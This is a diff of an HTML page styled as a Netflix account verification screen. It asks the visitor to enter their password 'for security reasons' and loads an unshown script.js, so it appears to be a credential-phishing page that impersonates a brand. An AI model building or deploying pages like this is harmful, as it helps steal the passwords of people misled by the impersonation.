@@ -3,18 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netflix - Verify Password</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>Netflix Account Verification</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7a/Logonetflix.png" class="logo" alt="Netflix Logo">
-        <h2>Verify Your Password</h2>
-        <input type="password" class="input-field" placeholder="Enter your password" required>
-        <button class="btn" id="verifyBtn">Continue</button>
-        <p class="bottom-text">Having trouble? <a href="#">Need help?</a></p>
-        <button class="btn login-btn" id="loginBtn">Go to Login</button>
+        <h2>Verify Your Netflix Account</h2>
+        <p>For security reasons, please verify your password to continue.</p>
+        <input type="password" id="password" class="input-field" placeholder="Enter your password">
+        <button id="verifyBtn">Verify</button>
+        <p class="error-message" id="error"></p>
+        <a href="login.html">Back to Login</a>
     </div>
+    
     <script src="script.js"></script>
 </body>
 </html>
